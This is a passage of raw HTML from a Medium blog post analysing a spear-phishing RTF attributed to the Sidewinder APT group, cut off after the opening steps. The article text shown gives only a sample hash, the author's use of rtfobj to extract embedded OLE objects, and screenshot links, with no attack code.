12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w gp gq"><div class="gr ab"><span><a class="ag ah ai aj ak al am an ao ap aq ar as at au" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" rel="noopener follow"><div class="bf b bg z cm gs gt ab q cn gu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="db l">Write</div></div></a></span></div></div><div class="k j i d"><div class="gr ab"><a class="ag ah ai aj ak al am an ao ap aq ar as at au" data-testid="headerSearchButton" href="https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><div class="bf b bg z cm gs gt ab q cn gu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="gr h k j"><div class="ab q"><p class="bf b fh fi fj fk fl fm fn fo fp fq cm"><span><button class="bf b fh fi fr fj fk fs fl fm ft fu fo fv fw fq fx fy fz ga gb gc gd ge gf gg gh gi gj gk gl gm bm gn go" data-testid="headerSignUpButton">Sign up</button></span></p><div class="cq l"><p class="bf b fh fi fj fk fl fm fn fo fp fq cm"><span><a class="ag ah ai aj ak al am an ao ap aq ar as at au" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay gv an ab q ap gw gx gy" aria-label="user options menu" data-testid="headerUserIcon"><div class="l gs"><img alt="" class="l gm by bz ca ei" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="gz by l bz ca ha n ay hb"></div></div></button></div></div></div><div class="ab"><div class="cb cc cd ce"><div class="ba cf ab cg ch ci cj ck"><a class="ag ah ai ay ak al am an ao ap aq ar as at au bh cl" href="https://medium.com/?source=post_page--------------------------------------------" rel="noopener follow"><div class="bf b bg z cm cn co cp"><div class="ab q"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Home"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" d="M4.5 10.75v10.5c0 .138.112.25.25.25h5a.25.25 0 0 0 .25-.25v-5.5a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v5.5c0 .138.112.25.25.25h5a.25.25 0 0 0 .25-.25v-10.5M22 9l-9.1-6.825a1.5 1.5 0 0 0-1.8 0L2 9"></path></svg><div class="cq l"><p class="bf b bg z cr cs ct cu cv cw cx cy cm">Home</p></div></div></div></a><details class="cr"><summary class="q ap ab cz bf b bg z cm cn co cp"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path stroke="currentColor" stroke-linecap="round" d="M6 4h13M8 2h9"></path><rect width="15" height="15" x="4.5" y="6.5" stroke="currentColor" rx="1.5"></rect><rect width="7" height="1" x="7" y="14" fill="currentColor" rx="0.5"></rect><rect width="10" height="1" x="7" y="17" fill="currentColor" rx="0.5"></rect></svg><div class="cq l ae"><p class="bf b bg z cr cs ct cu cv cw cx cy cm">Following</p></div><div class="da db" style="transform:rotate(0deg"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" fill="none" viewBox="0 0 24 24" class="dc dd de df"><path d="m6 9 6 6 6-6"></path></svg></div></summary><div style="height:0"><div class="l"><div class="dg l"></div></div></div></details><details class="cr"><summary class="q ap ab cz bf b bg z cm cn co cp"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Lists"><path stroke="currentColor" d="M6.44 6.69a1.5 1.5 0 0 1 1.06-.44h9a1.5 1.5 0 0 1 1.06.44l.354-.354-.353.353A1.5 1.5 0 0 1 18 7.75v14l-5.694-4.396-.306-.236-.306.236L6 21.75v-14c0-.398.158-.78.44-1.06Z"></path><path stroke="currentColor" stroke-linecap="round" d="M12.5 2.75h-8a2 2 0 0 0-2 2v11.5"></path></svg><div class="cq l ae"><p class="bf b bg z cr cs ct cu cv cw cx cy cm">Library</p></div><div class="da db" style="transform:rotate(0deg"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" fill="none" viewBox="0 0 24 24" class="dc dd de df"><path d="m6 9 6 6 6-6"></path></svg></div></summary><div style="height:0"><div class="l"><a class="ag ah ai ay ak al am an ao ap aq ar as at au bh cl" href="https://medium.com/me/lists?source=post_page--------------------------------------------" rel="noopener follow"><div class="bf b bg z cm cn co dh">Your lists</div></a><a class="ag ah ai ay ak al am an ao ap aq ar as at au bh cl" href="https://medium.com/me/lists/saved?source=post_page--------------------------------------------" rel="noopener follow"><div class="bf b bg z cm cn co dh">Saved lists</div></a><a class="ag ah ai ay ak al am an ao ap aq ar as at au bh cl" href="https://medium.com/me/list/highlights?source=post_page--------------------------------------------" rel="noopener follow"><div class="bf b bg z cm cn co dh">Highlights</div></a><a class="ag ah ai ay ak al am an ao ap aq ar as at au bh cl" href="https://medium.com/me/lists/reading-history?source=post_page--------------------------------------------" rel="noopener follow"><div class="bf b bg z cm cn co dh">Reading history</div></a><div class="dg l"></div></div></div></details><div class="di dj dk l"></div><a class="ag ah ai ay ak al am an ao ap aq ar as at au bh cl" href="https://medium.com/me/stories/drafts?source=post_page--------------------------------------------" rel="noopener follow"><div class="bf b bg z cm cn co cp"><div class="ab q"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Stories"><path stroke="currentColor" d="M4.75 21.5h14.5a.25.25 0 0 0 .25-.25V2.75a.25.25 0 0 0-.25-.25H4.75a.25.25 0 0 0-.25.25v18.5c0 .138.112.25.25.25Z"></path><path stroke="currentColor" stroke-linecap="round" d="M8 8.5h8M8 15.5h5M8 12h8"></path></svg><div class="cq l"><p class="bf b bg z cr cs ct cu cv cw cx cy cm">Stories</p></div></div></div></a><a class="ag ah ai ay ak al am an ao ap aq ar as at au bh cl" href="https://medium.com/me/stats?source=post_page--------------------------------------------" rel="noopener follow"><div class="bf b bg z cm cn co cp"><div class="ab q"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Stats"><path stroke="currentColor" d="M2.75 19h4.5a.25.25 0 0 0 .25-.25v-6.5a.25.25 0 0 0-.25-.25h-4.5a.25.25 0 0 0-.25.25v6.5c0 .138.112.25.25.25ZM9.75 19h4.5a.25.25 0 0 0 .25-.25V8.25a.25.25 0 0 0-.25-.25h-4.5a.25.25 0 0 0-.25.25v10.5c0 .138.112.25.25.25ZM16.75 19h4.5a.25.25 0 0 0 .25-.25V4.25a.25.25 0 0 0-.25-.25h-4.5a.25.25 0 0 0-.25.25v14.5c0 .138.112.25.25.25Z"></path></svg><div class="cq l"><p class="bf b bg z cr cs ct cu cv cw cx cy cm">Stats</p></div></div></div></a></div></div><div class="dl l dm"><div class="l"><div class="hc hd he hf hg l"><div class="ab dn"><div class="du bh hh hi hj hk"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="ha hq hr hs ht hu"></div><div class="hv hw hx hy hz"><div class="ab dn"><div class="du bh hh hi hj hk"><div><h1 id="b4a6" class="pw-post-title ia ib ic bf id ie if ig ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc bk" data-testid="storyTitle">APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading</h1><div><div class="speechify-ignore ab ea"><div class="speechify-ignore bh l"><div class="jd je jf jg jh ab"><div><div class="ab ji"><div><div class="bm" aria-hidden="false"><a rel="noopener follow" href="/?source=post_page---byline--5bc1a7e7c84c---------------------------------------"><div class="l jj jk by jl jm"><div class="l gs"><img alt="Sebdraven" class="l gm by ep eq ei" src="https://miro.medium.com/v2/resize:fill:88:88/1*ycwwStTvoVxriAE2No5ipQ.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="jn by l ep eq ha n jo hb"></div></div></div></a></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="jp ab q"><div class="ab q jq"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b jr js bk"><a class="ag ah ai aj ak al am an ao ap aq ar as jt" data-testid="authorName" rel="noopener follow" href="/?source=post_page---byline--5bc1a7e7c84c---------------------------------------">Sebdraven</a></p></div></div></div><span class="ju jv" aria-hidden="true"><span class="bf b bg z bk">·</span></span><p class="bf b jr js bk"><span><a class="ag ah ai aj ak al am an ao ap aq ar as jw" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F11d98531eebe&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=post_page-11d98531eebe--byline--5bc1a7e7c84c---------------------post_header------------------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l ce"><span class="bf b bg z cm"><div class="ab dz jx jy jz"><span class="bf b bg z cm"><div class="ab ae"><span data-testid="storyReadTime">7 min read</span><div class="ka kb l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z cm">·</span></span></div><span data-testid="storyPublishDate">Jul 16, 2018</span></div></span></div></span></div></div></div><div class="ab ea kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr"><div class="h k w gp gq q"><div class="lh l"><div class="ab q li lj"><div class="pw-multi-vote-icon gs lk ll lm ln"><span><a class="ag ah ai aj ak al am an ao ap aq ar as at au" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=---header_actions--5bc1a7e7c84c---------------------clap_footer------------------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="lo ap lp lq lr ls an lt lu lv ln"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lw lx ly lz ma mb mc"><p class="bf b ff z cm"><span class="md">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ap lo me mf ab q gt mg mh" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="mi"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q ks kt ku kv kw kx ky kz la lb lc ld le lf lg"><div class="mj k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="ag ah ai aj ak al am an ao ap aq ar as at au" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=---header_actions--5bc1a7e7c84c---------------------bookmark_footer------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="cm mk" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="gm ml dz"><div class="l ae"><div class="ab dn"><div class="mm mn mo mp mq mr du bh"><div class="ab"><div class="bm" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="ag gt ai aj ak al am ms ao ap aq gg mt mu mh mv mw mx my mz s na nb nc nd ne nf ng u nh ni nj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z cm">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="ag gt ai aj ak al am ms ao ap aq gg mt mu mh mv mw mx my mz s na nb nc nd ne nf ng u nh ni nj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z cm">Share</p></div></button></div></div></div></div></div></div></div></div></div><h1 id="73e7" class="nk nl ic bf nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh bk"><span class="l oi oj ok bo ol om on oo op gs">S</span>pear phishing</h1><p id="a25c" class="pw-post-body-paragraph oq or ic os b ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn hv bk">I’ve started few days ago an analysis on a RTF following my recent researches.</p><p id="4ce6" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">I found it this: 892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488</p><p id="9ab8" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">I execute rtfobj on it and two ole embedded objects malforfed:</p><figure class="pw px py pz qa qb pt pu paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu pv"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*clv0SwElLXu5uycgGlttAA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*clv0SwElLXu5uycgGlttAA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*clv0SwElLXu5uycgGlttAA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*clv0SwElLXu5uycgGlttAA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*clv0SwElLXu5uycgGlttAA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*clv0SwElLXu5uycgGlttAA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*clv0SwElLXu5uycgGlttAA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*clv0SwElLXu5uycgGlttAA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*clv0SwElLXu5uycgGlttAA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*clv0SwElLXu5uycgGlttAA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*clv0SwElLXu5uycgGlttAA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*clv0SwElLXu5uycgGlttAA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*clv0SwElLXu5uycgGlttAA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*clv0SwElLXu5uycgGlttAA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mr qg c" width="700" height="131" loading="lazy" role="presentation"/></picture></div></div></figure><p id="e410" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">But rtfobj extracts succeffully two raws objects:</p><figure class="pw px py pz qa qb pt pu paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*RoH4AT4fAqfiiy4hO3C8DA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*RoH4AT4fAqfiiy4hO3C8DA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*RoH4AT4fAqfiiy4hO3C8DA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*RoH4AT4fAqfiiy4hO3C8DA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*RoH4AT4fAqfiiy4hO3C8DA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*RoH4AT4fAqfiiy4hO3C8DA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*RoH4AT4fAqfiiy4hO3C8DA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mr qg c" width="700" height="36" loading="lazy" role="presentation"/></picture></div></div></figure><p id="6ef7" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The object 6A2A1 is very interesting:</p><figure class="pw px py pz qa qb pt pu paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu qi"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*jg292b2dNzrsJddVxaqeuQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jg292b2dNzrsJddVxaqeuQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jg292b2dNzrsJddVxaqeuQ.png 750w, 